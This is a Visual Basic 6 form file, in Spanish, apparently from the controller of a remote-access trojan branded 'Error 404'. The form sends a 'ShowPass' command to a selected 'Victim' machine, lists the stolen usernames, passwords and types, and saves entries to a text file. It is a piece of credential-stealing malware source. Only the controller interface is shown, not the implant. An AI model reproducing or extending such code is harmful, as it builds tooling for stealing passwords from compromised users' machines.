VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form frmPass 
   BackColor       =   &H00FFFFFF&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Error 404 - Contraseñas"
   ClientHeight    =   7095
   ClientLeft      =   150
   ClientTop       =   150
   ClientWidth     =   6855
   Icon            =   "frmPass.frx":0000
   LinkTopic       =   "Form4"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   7095
   ScaleWidth      =   6855
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin MSComDlg.CommonDialog CD 
      Left            =   5520
      Top             =   6480
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.Frame fraPass 
      BackColor       =   &H00FFFFFF&
      Height          =   615
      Left            =   1440
      TabIndex        =   1
      Top             =   6360
      Width           =   3975
      Begin VB.CommandButton cmdSave 
         Caption         =   "Guardar"
         Height          =   305
         Left            =   2160
         TabIndex        =   3
         Top             =   200
         Width           =   1575
      End
      Begin VB.CommandButton cmdShowPass 
         Caption         =   "Ver Contraseñas"
         Height          =   305
         Left            =   240
         TabIndex        =   2
         Top             =   200
         Width           =   1575
      End
   End
   Begin MSComctlLib.ListView LV 
      Height          =   6255
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   6615
      _ExtentX        =   11668
      _ExtentY        =   11033
      View            =   3
      LabelEdit       =   1
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      GridLines       =   -1  'True
      _Version        =   393217
      Icons           =   "IL"
      SmallIcons      =   "IL"
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   1
      NumItems        =   3
      BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Text            =   "Usuario"
         Object.Width           =   4656
      EndProperty
      BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   1
         Text            =   "Contraseña"
         Object.Width           =   4304
      EndProperty
      BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   2
         Text            =   "Tipo"
         Object.Width           =   2540
      EndProperty
   End
   Begin MSComctlLib.ImageList IL 
      Left            =   6120
      Top             =   6480
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      ImageWidth      =   16
      ImageHeight     =   16
      MaskColor       =   12632256
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   3
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmPass.frx":48FA
            Key             =   ""
         EndProperty
         BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmPass.frx":4D4E
            Key             =   ""
         EndProperty
         BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmPass.frx":51A2
            Key             =   ""
         EndProperty
      EndProperty
   End
End
Attribute VB_Name = "frmPass"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Private Sub cmdSave_Click()
On Error Resume Next
CD.DialogTitle = "Guardar Contraseña"
CD.Filter = "Archivos de Texto|*.txt"
CD.ShowSave
If CD.FileName = "" Then
Exit Sub
Else
If LV.ListItems.Count = 0 Then
MsgBox "No hay ninguna contraseña para guardar", vbExclamation, "Error 404"
Exit Sub
End If
Open CD.FileName For Output As #1
Print #1, LV.SelectedItem
Close
End If
End Sub

Private Sub cmdShowPass_Click()
If Not cmdShowPass.Caption = "Refrescar" Then cmdShowPass.Caption = "Refrescar"
Send "ShowPass"
End Sub

Private Sub Form_Load()
On Error Resume Next
Dim Victim As String
Victim = frmMain.LV.SelectedItem
Me.Caption = "Error 404 - Contraseñas [" & Form1.LV.SelectedItem & "]"
End Sub
